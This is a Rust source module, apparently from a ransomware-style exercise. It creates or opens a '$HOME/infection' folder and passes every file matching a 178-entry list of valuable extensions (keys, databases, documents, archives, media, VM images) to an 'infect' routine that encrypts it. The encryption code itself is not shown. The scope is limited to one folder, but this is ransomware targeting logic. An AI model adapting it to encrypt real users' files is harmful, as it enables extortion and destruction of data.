pub mod infect;
use std::fs::{
    read_dir,
    ReadDir,
    DirBuilder
};
use std::path::PathBuf;
use crate::tools::Flags;
use infect::{
    infect
};

/*
 * Create infection folder in $HOME space
 */
pub fn create_folder_infection(path: &String) -> bool {
    let env = env!("HOME");
    let mut path_user: String = String::from(path);

    path_user.insert_str(0, env);
    let res_dir = DirBuilder::new().create(path_user);

    match res_dir {
        Ok(_dir) => {
            println!("Infection folder created.");
            return true;
        },
        Err(e) => {
            eprintln!("{e}");
            return false
        }
    }
}

/* Check infection folder existence */
pub fn folder_exist(res_dir: &Result<ReadDir, std::io::Error>) -> bool {
    return match res_dir {
        Ok(_) => {
            true
        },
        Err(e) => {
            eprintln!("{e}");
            false
        }
    }
}

/* Open folder and get files names  */
pub fn get_infection_path(path: &String) -> Result<ReadDir, std::io::Error> {
    let env = env!("HOME");
    let mut path_user: String = String::from(path);
    path_user.insert_str(0, env);
    println!("Folder infection path : {}", path_user);
    return read_dir(path_user);
}

/* parse content_type file */
pub fn accepted_type_file(arr: &[&str; 178], extension: &str) -> bool {
    for i in arr {
        if i == &extension {
            return true;
        }
    }
    false
}

/* Check extensions for each part
 * during check infect file
 */
fn start_infect(dir: ReadDir, list: &Flags) {
    let arr: [&str; 178] = ["der",
    "pfx",
    "key",
    "crt",
    "csr",
    "p12",
    "pem",
    "odt",
    "ott",
    "sxw",
    "stw",
    "uot",
    "3ds",
    "max",
    "3dm",
    "ods",
    "ots",
    "sxc",
    "stc",
    "dif",
    "slk",
    "wb2",
    "odp",
    "otp",
    "sxd",
    "std",
    "uop",
    "odg",
    "otg",
    "sxm",
    "mml",
    "lay",
    "lay6",
    "asc",
    "sqlite3",
    "sqlitedb",
    "sql",
    "accdb",
    "mdb",
    "db",
    "dbf",
    "odb",
    "frm",
    "myd",
    "myi",
    "ibd",
    "mdf",
    "ldf",
    "sln",
    "suo",
    "cs",
    "c",
    "cpp",
    "pas",
    "h",
    "asm",
    "js",
    "cmd",
    "bat",
    "ps1",
    "vbs",
    "vb",
    "pl",
    "dip",
    "dch",
    "sch",
    "brd",
    "jsp",
    "php",
    "asp",
    "rb",
    "java",
    "jar",
    "class",
    "sh",
    "mp3",
    "wav",
    "swf",
    "fla",
    "wmv",
    "mpg",
    "vob",
    "mpeg",
    "asf",
    "avi",
    "mov",
    "mp4",
    "3gp",
    "mkv",
    "3g2",
    "flv",
    "wma",
    "mid",
    "m3u",
    "m4u",
    "djvu",
    "svg",
    "ai",
    "psd",
    "nef",
    "tiff",
    "tif",
    "cgm",
    "raw",
    "gif",
    "png",
    "bmp",
    "jpg",
    "jpeg",
    "vcd",
    "iso",
    "backup",
    "zip",
    "rar",
    "7z",
    "gz",
    "tgz",
    "tar",
    "bak",
    "tbk",
    "bz2",
    "PAQ",
    "ARC",
    "aes",
    "gpg",
    "vmx",
    "vmdk", 
    "vdi",
    "sldm",
    "sldx",
    "sti",
    "sxi",
    "602",
    "hwp",
    "snt",
    "onetoc2",
    "dwg",
    "pdf",
    "wk1",
    "wks",
    "123",
    "rtf",
    "csv",
    "txt",
    "vsdx",
    "vsd",
    "edb",
    "eml",
    "msg",
    "ost",
    "pst",
    "potm",
    "potx",
    "ppam",
    "ppsx",
    "ppsm",
    "pps",
    "pot",
    "pptm",
    "pptx",
    "ppt",
    "xltm",
    "xltx",
    "xlc",
    "xlm",
    "xlt",
    "xlw",
    "xlsb",
    "xlsm",
    "xlsx",
    "xls",
    "dotx",
    "dotm",
    "dot",
    "docm",
    "docb",
    "docx",
    "doc",
    ];

    for i in dir {
        if let Ok(a) = i{
            let path: PathBuf = a.path();
            if let Some(extension) = path.extension() {
                if let Some(extension_str) = extension.to_str() {
                    if extension_str != "ft"
                        && accepted_type_file(&arr, extension_str) {
                        if infect(list, &path) {
                            println!("Encrypted");
                        } else {
                            eprintln!("Encryption failed");
                        }
                    }
                }
            }
        }
    }
}

/* check if infection in $HOME exist
 * if no return false and stop here
 * open folder infection
 * then start infection
 */
pub fn start_encrypt(list: &Flags) -> bool {
    let res_dir = get_infection_path(&"/infection".to_owned());
    let mut ret: bool = folder_exist(&res_dir);
    if !ret {
        ret = create_folder_infection(&"/infection".to_owned());
        return ret;
    }
    return match res_dir {
        Ok(dir) => {
            start_infect(dir, list);
            true
        },
        Err(e) => {
            eprintln!("{e}");
            false
        }
    };
}
